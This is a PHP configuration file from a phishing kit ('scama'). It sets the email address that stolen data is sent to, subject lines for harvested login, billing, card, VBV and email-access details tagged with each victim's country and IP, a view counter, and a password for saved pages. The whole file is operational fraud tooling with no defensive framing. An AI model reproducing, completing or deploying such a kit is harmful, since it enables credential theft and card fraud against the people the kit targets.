<?php
//Fixed By Aron-Tn
  //==>Bot changed 
  //==>other Small Modifieds

####This Just To Know Scama's Vues#
######### How To Show It ? #########
############### Eassy ###############
### Site.com/scama/Email.php?vues #####
$vues=0;
if(isset($_GET['vues'])){
	include'v.php';
	echo'Scama Vues:'.$vues;
	exit();
}
######## From Name #######
$From = "Xbalti";
######## Save html #######
$save = "off";//on if you want to save html
######## Subject Logn #######
$subjec_login="LOGIN INFO FROM [".$_SESSION['country']."] 😈 [".$_SESSION['_ip_']."]";
######## Subject Billing #######
$subjec_bill ="BILLING INFO FROM [".$_SESSION['country']."] 😈 [".$_SESSION['_ip_']."]";//subject here
######## Subject CC #######
$subjec_cc="CARD INFO FROM [".$_SESSION['country']."] 😈 [".$_SESSION['_ip_']."]";
######## Subject VBV #######
$subjec_vbv="VBV INFO FROM [".$_SESSION['country']."] 😈 [".$_SESSION['_ip_']."]";
######## Subject Email Access #######
$subjec_access="EMAIL ACCESS INFO FROM [".$_SESSION['country']."] 😈 [".$_SESSION['_ip_']."]";
######## To Email #######
$Email = "itachi.walker@hotmail.com"; // Your Email Here :)
######## pswd here if you wrote save html on #######
$_SESSION['ps'] = "badre";

?>

